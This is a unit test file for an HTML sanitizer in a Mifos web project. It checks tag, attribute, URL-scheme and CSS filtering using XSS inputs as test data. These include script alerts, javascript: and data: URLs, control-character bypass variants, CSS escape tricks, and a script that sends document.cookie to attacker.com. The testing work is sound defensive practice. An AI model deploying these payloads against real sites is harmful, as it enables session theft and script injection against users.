/**
 * Copyright since 2025 Mifos Initiative
 *
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */

// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import { sanitizeHtml } from '../sanitize-html'

describe('sanitizeHtml', () => {
  describe('falsy and plain text inputs', () => {
    it('returns an empty string when given an empty or falsy string', () => {
      expect(sanitizeHtml('')).toBe('')
      expect(sanitizeHtml(null)).toBe('')
      expect(sanitizeHtml(undefined)).toBe('')
    })

    it('returns plain text without modification', () => {
      expect(sanitizeHtml('Just a plain text message')).toBe(
        'Just a plain text message'
      )
    })

    it('preserves text while escaping HTML-significant characters', () => {
      expect(sanitizeHtml('5 < 10 & 10 > 5')).toBe('5 &lt; 10 &amp; 10 &gt; 5')
    })
  })

  describe('forbidden tags removal', () => {
    it.each([
      ['script', '<script>alert("xss")</script>'],
      ['style', '<style>body { display: none; }</style>'],
      ['iframe', '<iframe src="https://evil.com"></iframe>'],
      ['form', '<form action="/evil"><button>Submit</button></form>'],
      ['input', '<input type="password" value="secret" />'],
      ['textarea', '<textarea>Some content</textarea>'],
      ['select', '<select><option>Option 1</option></select>'],
      ['object', '<object data="exploit.swf">Fallback</object>'],
      ['embed', '<embed src="exploit.swf" />'],
      ['applet', '<applet code="Evil.class">Fallback</applet>'],
      ['frame', '<frame src="evil.html" />'],
      ['frameset', '<frameset cols="50%,50%"></frameset>'],
      ['link', '<link rel="stylesheet" href="evil.css" />'],
      [
        'meta',
        '<meta http-equiv="refresh" content="0;url=https://evil.com" />',
      ],
      ['base', '<base href="https://evil.com" />'],
      ['param', '<param name="autoplay" value="true" />'],
      ['template', '<template><div>Template content</div></template>'],
      ['math', '<math><mi>x</mi></math>'],
      [
        'svg',
        '<svg><circle cx="50" cy="50" r="40" /><script>alert(1)</script></svg>',
      ],
    ])(
      'completely removes dangerous <%s> tag along with its content',
      (_, input) => {
        expect(sanitizeHtml(input)).toBe('')
      }
    )

    it('removes forbidden tags when nested inside allowed elements', () => {
      const input =
        '<p>Before script <script>alert("hacked")</script> After script</p>'
      expect(sanitizeHtml(input)).toBe('<p>Before script  After script</p>')

      const noscript = '<div><noscript>Hidden content</noscript></div>'
      expect(sanitizeHtml(noscript)).toBe('<div></div>')
    })
  })

  describe('unknown / disallowed tags unwrapping', () => {
    it('unwraps unknown tags while preserving inner text content', () => {
      expect(sanitizeHtml('<custom-widget>Hello world</custom-widget>')).toBe(
        'Hello world'
      )
      expect(sanitizeHtml('<marquee>Rolling text</marquee>')).toBe(
        'Rolling text'
      )
      expect(sanitizeHtml('<blink>Flashing text</blink>')).toBe('Flashing text')
    })

    it('unwraps unknown tags while preserving child elements', () => {
      expect(
        sanitizeHtml('<font color="red"><strong>Bold alert</strong></font>')
      ).toBe('<strong>Bold alert</strong>')
    })

    it('unwraps multiple layers of unknown tags', () => {
      expect(sanitizeHtml('<foo><bar>Deeply nested text</bar></foo>')).toBe(
        'Deeply nested text'
      )
    })
  })

  describe('allowed tags preservation', () => {
    it('preserves allowed text formatting elements', () => {
      const input =
        '<p>Paragraph with <b>bold</b>, <strong>strong</strong>, <i>italic</i>, <em>emphasis</em>, <u>underline</u>, <s>strike</s>, <small>small</small>, <sub>sub</sub>, <sup>sup</sup>, <abbr>abbr</abbr>, and <code>code</code>.</p>'
      expect(sanitizeHtml(input)).toBe(input)
    })

    it('preserves headers, blockquotes, pre, br, and hr', () => {
      const input =
        '<h1>H1</h1><h2>H2</h2><h3>H3</h3><h4>H4</h4><h5>H5</h5><h6>H6</h6><blockquote>Quote</blockquote><pre>Code block</pre><hr><br>'
      expect(sanitizeHtml(input)).toBe(input)
    })

    it('preserves unordered and ordered lists', () => {
      const ul = '<ul><li>Item 1</li><li>Item 2</li></ul>'
      const ol = '<ol><li>Step 1</li><li>Step 2</li></ol>'
      expect(sanitizeHtml(ul)).toBe(ul)
      expect(sanitizeHtml(ol)).toBe(ol)
    })

    it('preserves description lists and figure elements', () => {
      const dl = '<dl><dt>Term</dt><dd>Description</dd></dl>'
      const figure =
        '<figure><img src="https://example.com/pic.jpg" alt="Photo"><figcaption>A photo caption</figcaption></figure>'
      expect(sanitizeHtml(dl)).toBe(dl)
      expect(sanitizeHtml(figure)).toBe(figure)
    })

    it('preserves full table structures', () => {
      const table =
        '<table><caption>Monthly Statement</caption><colgroup><col></colgroup><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Data</td></tr></tbody><tfoot><tr><td>Footer</td></tr></tfoot></table>'
      expect(sanitizeHtml(table)).toBe(table)
    })
  })

  describe('attribute filtering', () => {
    it('retains permitted global attributes', () => {
      const input =
        '<p align="center" class="text-primary" dir="ltr" lang="en" title="Helpful tooltip">Content</p>'
      expect(sanitizeHtml(input)).toBe(input)
    })

    it('removes unauthorized global attributes such as id and data-* attributes', () => {
      const input =
        '<div id="main-content" data-user-id="12345" tabindex="0">Hello</div>'
      expect(sanitizeHtml(input)).toBe('<div>Hello</div>')
    })

    it('strips all inline event handlers (on*)', () => {
      const input =
        '<img src="https://example.com/pic.png" alt="Test" onload="alert(1)" onerror="alert(2)" onclick="alert(3)">'
      expect(sanitizeHtml(input)).toBe(
        '<img src="https://example.com/pic.png" alt="Test">'
      )
    })

    it('retains allowed tag-specific attributes', () => {
      const img =
        '<img src="https://example.com/avatar.png" alt="Avatar" width="100" height="100">'
      expect(sanitizeHtml(img)).toBe(img)

      const ol = '<ol reversed="" start="5" type="A"><li>Item</li></ol>'
      expect(sanitizeHtml(ol)).toBe(ol)

      const table =
        '<table border="1" cellpadding="2" cellspacing="0" summary="Summary info" width="500"><tbody><tr><td colspan="2" rowspan="1" headers="h1" valign="top">Cell</td></tr></tbody></table>'
      expect(sanitizeHtml(table)).toBe(table)

      const col =
        '<table><colgroup span="2" width="50"><col span="1" width="25"></colgroup></table>'
      expect(sanitizeHtml(col)).toBe(col)

      const th =
        '<table><thead><tr><th abbr="Desc" colspan="2" rowspan="1" headers="h0" scope="col" valign="bottom">Col</th></tr></thead></table>'
      expect(sanitizeHtml(th)).toBe(th)
    })

    it('strips tag-specific attributes when used on invalid tags', () => {
      const input = '<p href="https://example.com" width="100">Paragraph</p>'
      expect(sanitizeHtml(input)).toBe('<p>Paragraph</p>')
    })
  })

  describe('link security (<a> tags)', () => {
    it('preserves safe <a> tags with href and name attributes', () => {
      const input = '<a href="https://mifos.org" name="anchor">Mifos</a>'
      expect(sanitizeHtml(input)).toBe(input)
    })

    it('automatically adds rel="noopener noreferrer" when target is specified', () => {
      const input = '<a href="https://mifos.org" target="_blank">External</a>'
      expect(sanitizeHtml(input)).toBe(
        '<a href="https://mifos.org" target="_blank" rel="noopener noreferrer">External</a>'
      )
    })

    it('overrides any existing rel attribute with noopener noreferrer when target is present', () => {
      const input =
        '<a href="https://mifos.org" target="_blank" rel="opener">External</a>'
      expect(sanitizeHtml(input)).toBe(
        '<a href="https://mifos.org" target="_blank" rel="noopener noreferrer">External</a>'
      )
    })

    it('does not add rel attribute when target is not specified', () => {
      const input = '<a href="https://mifos.org">Internal</a>'
      expect(sanitizeHtml(input)).toBe(input)
    })

    it('removes rel when target is not specified', () => {
      expect(
        sanitizeHtml(
          '<a href="https://mifos.org" rel="noopener noreferrer">Link</a>'
        )
      ).toBe('<a href="https://mifos.org">Link</a>')
    })
  })

  describe('URL scheme validation', () => {
    it.each([
      ['http', 'http://example.com'],
      ['https', 'https://example.com/path?query=1#hash'],
      ['mailto', 'mailto:support@mifos.org'],
      ['tel', 'tel:+1234567890'],
      ['relative path', '/loans/view/12'],
      ['relative fragment', '#section-1'],
      ['mustache placeholder', '{{client.website}}'],
    ])('allows safe URL scheme or relative link: %s', (_, url) => {
      const input = `<a href="${url}">Link</a>`
      expect(sanitizeHtml(input)).toBe(input)
    })

    it.each([
      ['javascript:alert(1)'],
      ['JAVASCRIPT:alert(document.cookie)'],
      ['vbscript:msgbox(1)'],
      ['data:text/html,<script>alert(1)</script>'],
      [
        'data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+',
      ],
      ['file:///etc/passwd'],
    ])('strips unsafe URL attribute: %s', unsafeUrl => {
      const input = `<a href="${unsafeUrl}">Click</a>`
      expect(sanitizeHtml(input)).toBe('<a>Click</a>')
    })

    it('strips safe-looking schemes that attempt control-character or whitespace bypasses', () => {
      const input1 = '<a href="java\tscript:alert(1)">Click</a>'
      expect(sanitizeHtml(input1)).toBe('<a>Click</a>')

      const input2 = '<a href="java\x01script:alert(1)">Click</a>'
      expect(sanitizeHtml(input2)).toBe('<a>Click</a>')

      const input3 = '<a href="java\r\nscript:alert(1)">Click</a>'
      expect(sanitizeHtml(input3)).toBe('<a>Click</a>')

      const input4 = '<a href="java\x7fscript:alert(1)">Click</a>'
      expect(sanitizeHtml(input4)).toBe('<a>Click</a>')

      const input5 = '<a href="java  script:alert(1)">Click</a>'
      expect(sanitizeHtml(input5)).toBe('<a>Click</a>')
    })

    it('allows safe raster image data URLs on <img> tags', () => {
      const safeDataUrl =
        'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='
      const input = `<img src="${safeDataUrl}" alt="Dot">`
      expect(sanitizeHtml(input)).toBe(input)
    })

    it('strips javascript URLs from image sources', () => {
      expect(sanitizeHtml('<img src="javascript:alert(1)" alt="Image">')).toBe(
        '<img alt="Image">'
      )
    })

    it('strips unsafe data URLs (like svg or text/html) from <img> tags', () => {
      const unsafeSvgData = 'data:image/svg+xml;base64,PHN2Zz48L3N2Zz4='
      const input = `<img src="${unsafeSvgData}" alt="Image">`
      expect(sanitizeHtml(input)).toBe('<img alt="Image">')
    })

    it('preserves empty href or src attribute without throwing', () => {
      expect(sanitizeHtml('<a href="">Empty Link</a>')).toBe(
        '<a href="">Empty Link</a>'
      )
    })
  })

  describe('inline style sanitization', () => {
    it('preserves allowed CSS styling properties', () => {
      const input =
        '<span style="color: red; font-size: 14px; margin-top: 10px; background-color: rgb(255, 255, 255)">Styled text</span>'
      expect(sanitizeHtml(input)).toBe(
        '<span style="color: red; font-size: 14px; margin-top: 10px; background-color: rgb(255, 255, 255)">Styled text</span>'
      )
    })

    it('allows permitted color functions in style values', () => {
      const input =
        '<div style="color: rgba(0, 0, 0, 0.5); background-color: hsl(120, 100%, 50%); border-color: hsla(240, 100%, 50%, 0.8)">Colored</div>'
      expect(sanitizeHtml(input)).toBe(input)
    })

    it('removes disallowed CSS properties like positioning and z-index', () => {
      const input =
        '<div style="position: absolute; top: 0; left: 0; z-index: 9999; display: flex; color: green">Banner</div>'
      expect(sanitizeHtml(input)).toBe('<div style="color: green">Banner</div>')
    })

    it('blocks dangerous CSS functions like url() and expression()', () => {
      const input =
        '<div style="background-color: url(\'https://evil.com/bg.png\'); color: blue">Content</div>'
      expect(sanitizeHtml(input)).toBe('<div style="color: blue">Content</div>')
    })

    it('rejects CSS declarations with backslashes or CSS comment escapes', () => {
      const backslashInput =
        '<div style="background-color: \\75 rl(javascript:alert(1)); color: red">Content</div>'
      expect(sanitizeHtml(backslashInput)).toBe(
        '<div style="color: red">Content</div>'
      )

      const commentInput =
        '<div style="color: red/*comment*/; font-weight: bold">Content</div>'
      expect(sanitizeHtml(commentInput)).toBe(
        '<div style="font-weight: bold">Content</div>'
      )
    })

    it('completely removes the style attribute if no declarations remain safe', () => {
      const input =
        '<p style="position: fixed; z-index: 1000; display: block">Text</p>'
      expect(sanitizeHtml(input)).toBe('<p>Text</p>')
    })

    it('ignores invalid or empty style declarations', () => {
      const input = '<p style="color; font-size: ; width: 100px">Text</p>'
      expect(sanitizeHtml(input)).toBe('<p style="width: 100px">Text</p>')
    })
  })

  describe('nested and complex template markup', () => {
    it('is idempotent', () => {
      const input =
        '<div><script>alert(1)</script><p style="color: red">Safe</p></div>'
      const once = sanitizeHtml(input)

      expect(sanitizeHtml(once)).toBe(once)
    })

    it('correctly handles template content with Mustache placeholders', () => {
      const template =
        '<div>Dear {{client.displayName}},<br><p>Your loan account <strong>{{loan.accountNo}}</strong> has a principal of {{loan.principal}}.</p></div>'
      expect(sanitizeHtml(template)).toBe(template)
    })

    it('cleans mixed legitimate content with injected malicious tags', () => {
      const dirtyHtml = `
        <div class="template-header">
          <h1>Account Summary</h1>
          <script>document.location='http://attacker.com/steal?cookie='+document.cookie;</script>
          <p>Welcome, <span style="font-weight: bold; position: absolute">{{client.name}}</span>!</p>
          <iframe src="javascript:alert(1)"></iframe>
        </div>
      `.trim()

      const result = sanitizeHtml(dirtyHtml)
      expect(result).not.toContain('<script>')
      expect(result).not.toContain('<iframe>')
      expect(result).not.toContain('position: absolute')
      expect(result).toContain('<div class="template-header">')
      expect(result).toContain('<h1>Account Summary</h1>')
      expect(result).toContain(
        '<p>Welcome, <span style="font-weight: bold">{{client.name}}</span>!</p>'
      )
    })
  })
})
